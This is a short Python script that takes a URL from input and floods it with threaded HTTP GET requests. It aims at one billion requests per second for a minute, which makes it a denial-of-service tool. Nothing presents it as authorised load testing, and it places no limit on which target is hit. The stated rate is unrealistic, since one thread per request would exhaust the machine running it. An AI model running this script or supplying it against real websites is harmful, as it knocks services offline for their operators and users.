import requests
import threading
import time

def send_request(url):
    try:
        response = requests.get(url)
        print(f"Response status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def send_requests(url, num_requests):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def main():
    url = input("Enter the URL to send requests to: ")
    num_requests_per_second = 1000000000  # Total requests per second
    duration = 60  # Duration in seconds (1 minute)

    end_time = time.time() + duration
    while time.time() < end_time:
        start_time = time.time()
        send_requests(url, num_requests_per_second)

        # Calculate elapsed time and sleep for the remaining time to maintain the rate
        elapsed_time = time.time() - start_time
        sleep_time = max(0, 1 - elapsed_time)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
